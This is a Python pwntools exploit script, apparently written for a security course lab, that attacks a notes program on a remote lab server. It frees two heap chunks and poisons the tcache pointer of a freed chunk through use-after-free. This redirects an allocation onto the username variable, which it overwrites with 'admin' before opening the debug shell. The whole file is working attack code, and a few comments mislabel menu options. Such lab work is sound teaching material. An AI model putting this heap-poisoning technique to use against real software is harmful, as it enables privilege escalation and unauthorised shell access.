from pwn import *

# Launch exploit process
#p = gdb.debug("./lab8-2.bin")            # run exploit against binary locally with process attached to gdb
#p = process("./lab8-2.bin")              # run exploit against binary locally without attacking the process to gdb
p = remote("csc748.hostbin.org", 7082)   # run the exploit against a remote process

# Request the 1st chunk from the top chunk
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Debug shell")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "New"
p.sendline(b'1')
# Get contents
contents = p.recvuntil("Contents: ")
print(contents.decode("utf-8"))
p.sendline(b'A'*16)
# Get message
message = p.recvline()
print(message.decode("utf-8"))
print("\n")

# Request the 2nd chunk from the top chunk
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
print("\n")
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Debug shell")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "New"
p.sendline(b'1')
# Get contents
contents = p.recvuntil("Contents: ")
print(contents.decode("utf-8"))
p.sendline(b'B'*16)
# Get message
message = p.recvline()
print(message.decode("utf-8"))
print("\n")

# Free the 1st chunk
print("\n")
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Debug shell")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "Delete"
p.sendline(b'3')
# Get message
message = p.recvuntil("Note ID?: ")
print(message.decode("utf-8"))
p.sendline(b'0')
print("\n")

# Free the 2nd chunk
print("\n")
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Debug shell")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "Delete"
p.sendline(b'3')
# Get message
message = p.recvuntil("Note ID?: ")
print(message.decode("utf-8"))
p.sendline(b'1')
print("\n")


# Read to validate that the freed 2nd chunck is accessible
print("\n")
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Debug shell")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "Edit"
p.sendline(b'2')
# Get message
message = p.recvuntil("Note ID?: ")
print(message.decode("utf-8"))
p.sendline(b'1')
# Get contents
contents = p.recvline()
print(contents)
print("\n")


# Access the freed 2nd chunck and poison its pointer to redirect us to the username variable memory address instead point to the 1st freed/resuable chunk
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Debug shell")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "Edit"
p.sendline(b'4')
# Get message
message = p.recvuntil("Note ID?: ")
print(message.decode("utf-8"))
p.sendline(b'1')
# Get contents
contents = p.recvuntil("New contents: ")
print(contents.decode("utf-8"))
p.sendline(p64(0x4040a0)) 
print("\n")


# Request a 2nd freed/reusable chunck from Tcache, grooming the heap to allow for accessing the username variable as the 1st freed/reusable chunk
print("\n")
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
print("\n")
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Debug shell")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "New"
p.sendline(b'1')
# Get contents
contents = p.recvuntil("Contents: ")
print(contents.decode("utf-8"))
p.sendline(b'Grooming Chunk')
# Get message
message = p.recvline()
print(message.decode("utf-8"))
print("\n")


# Access username variable after poisoning the Tcache by requesting a 1st freed/reusable chuck, replacing the value "guest" with "admin"
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Debug shell")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "New"
p.sendline(b'1')
# Get contents
contents = p.recvuntil("Contents: ")
print(contents.decode("utf-8"))
p.sendline(b'admin')
# Get message
message = p.recvline()
print(message.decode("utf-8"))
print("\n")

# Execute debug shell with elevated admin priviliges after the username variable has been changed
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) View, (3) Delete, (4) Edit, (5) Debug shell")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "New"
p.sendline(b'5')

# Switch to interactive after gaining shell
p.interactive()
